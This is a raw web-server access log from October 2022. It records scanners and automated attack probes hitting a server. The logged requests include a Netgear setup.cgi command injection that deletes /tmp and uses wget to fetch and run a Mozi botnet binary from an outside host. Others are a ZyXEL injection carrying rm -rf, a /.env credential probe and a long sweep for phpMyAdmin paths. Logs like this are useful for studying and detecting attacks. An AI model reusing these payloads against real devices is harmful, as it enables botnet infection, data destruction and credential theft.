167.94.145.58 - - [01/Oct/2022:14:05:47 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
167.94.145.58 - - [01/Oct/2022:14:05:47 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.58 - - [01/Oct/2022:14:05:47 +0300] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.145.58 - - [01/Oct/2022:14:05:47 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
111.118.40.97 - - [01/Oct/2022:14:30:41 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
111.118.40.97 - - [01/Oct/2022:14:30:41 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:14:33:33 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03W+\x5C\x93\x97\x8C\xF2\xE9\xA9\xC3m9\xDC\xEA}\x87A\xC75V\xFF\xB3\xFE\xB0)\xE8\xDC\x80*\x87\x92\xEF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:14:33:33 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFA\x12u,1\xA0:\xBC\xB8L\xE4S\x09\xD0P\xDC\x81\xDFZ\xEE\xFD6%\xAF\xFA\x11a)c\xC2/\x9B\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:14:33:33 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
111.118.40.97 - - [01/Oct/2022:14:34:39 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
111.118.40.97 - - [01/Oct/2022:14:34:39 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
205.210.31.60 - - [01/Oct/2022:14:38:52 +0300] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC4\x22\xB5v\x9D\xA1M\xDES\x85r,\x12l\x09\xE0\x07^I\x90\x1B\x88r\x8FR\xD9$Ez2R\xD4\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
13.127.221.6 - - [01/Oct/2022:15:17:21 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
13.127.221.6 - - [01/Oct/2022:15:17:21 +0300] "remoteSubmit=Save" 400 157 "-" "-"
52.53.168.155 - - [01/Oct/2022:15:19:20 +0300] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
198.235.24.166 - - [01/Oct/2022:15:34:40 +0300] "GET / HTTP/1.0" 200 3320 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
178.62.106.82 - - [01/Oct/2022:16:34:11 +0300] "\xAD\x04\xDA\x9B\x7Fj\x19\x8EA\x22\xD2\xC3\x08X\xEC&" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:16:34:11 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF1r>\x88\xCAB\xBD<\xBD\xA3\xA3\x06%\xCFCH\xFEh\xF9\x93\xA0a\xB0}\x09\x8D\xB5\x8AH\x8A\x22\x1D\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:16:34:11 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:16:34:11 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
111.118.40.97 - - [01/Oct/2022:17:13:49 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
111.118.40.97 - - [01/Oct/2022:17:13:49 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
46.151.6.29 - - [01/Oct/2022:17:20:06 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
194.50.14.12 - - [01/Oct/2022:17:48:56 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
92.255.85.183 - - [01/Oct/2022:17:56:25 +0300] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
167.94.138.120 - - [01/Oct/2022:18:43:51 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
167.94.138.120 - - [01/Oct/2022:18:43:52 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.120 - - [01/Oct/2022:18:43:52 +0300] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.120 - - [01/Oct/2022:18:43:52 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
85.31.46.179 - - [01/Oct/2022:19:00:56 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 125 "http://82.179.90.12:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
85.31.46.179 - - [01/Oct/2022:19:00:56 +0300] "" 400 0 "-" "-"
223.152.19.121 - - [01/Oct/2022:19:18:59 +0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 153 "-" "-"
178.62.106.82 - - [01/Oct/2022:19:35:01 +0300] "\xFE\x81\x8A\x9Cd\xA9\xF9\x8D`\x8A\xBB#1\xBF\x9E\x0B" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:19:35:03 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x80\xE99\x1E\xA7\x5C8\xF8\xD6\x96j5\xD7\xC2\x8E+0\xD6\xCA6'\xBE\xA6\xDD\x04\x04\x9F8 n\x91\xAF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:19:35:03 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD2K\x9Avy\xC6&>m-\xF5\x91+\x12p\xC8\xAFi_`*\xDCk\x81%!\xB3H'\xDF\x7F\xE7\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [01/Oct/2022:19:35:03 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
34.168.165.213 - - [01/Oct/2022:19:39:35 +0300] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.168.165.213 - - [01/Oct/2022:19:39:35 +0300] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
59.95.95.85 - - [01/Oct/2022:19:50:46 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
130.211.54.158 - - [01/Oct/2022:19:59:37 +0300] "GET / HTTP/1.1" 200 1286 "-" "python-requests/2.28.1"
152.89.196.211 - - [01/Oct/2022:20:23:28 +0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2.187.231.136 - - [01/Oct/2022:20:37:53 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
188.161.28.56 - - [01/Oct/2022:20:39:22 +0300] "GET /agent/timeclock.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
162.142.125.220 - - [01/Oct/2022:20:41:40 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
162.142.125.220 - - [01/Oct/2022:20:41:41 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [01/Oct/2022:20:41:41 +0300] "PRI * HTTP/2.0" 400 157 "-" "-"
162.142.125.220 - - [01/Oct/2022:20:41:41 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
153.133.5.212 - - [01/Oct/2022:21:11:37 +0300] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:37 +0300] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:38 +0300] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:38 +0300] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:38 +0300] "GET /phpmyadmin2016/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:39 +0300] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:39 +0300] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:39 +0300] "GET /phppma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:39 +0300] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:40 +0300] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:40 +0300] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:40 +0300] "GET /mysql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:41 +0300] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:41 +0300] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:41 +0300] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:42 +0300] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:42 +0300] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:42 +0300] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:43 +0300] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:43 +0300] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:43 +0300] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:44 +0300] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:44 +0300] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:44 +0300] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:45 +0300] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:45 +0300] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:45 +0300] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:46 +0300] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:46 +0300] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:46 +0300] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:47 +0300] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:47 +0300] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:47 +0300] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:47 +0300] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:48 +0300] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:48 +0300] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:48 +0300] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:49 +0300] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:49 +0300] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:49 +0300] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:50 +0300] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:50 +0300] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:50 +0300] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:51 +0300] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:51 +0300] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:51 +0300] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:52 +0300] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:52 +0300] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:52 +0300] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:53 +0300] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:53 +0300] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:53 +0300] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:54 +0300] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:54 +0300] "GET /mysql/db/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:54 +0300] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:54 +0300] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:55 +0300] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:55 +0300] "GET /pma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:55 +0300] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:56 +0300] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:56 +0300] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
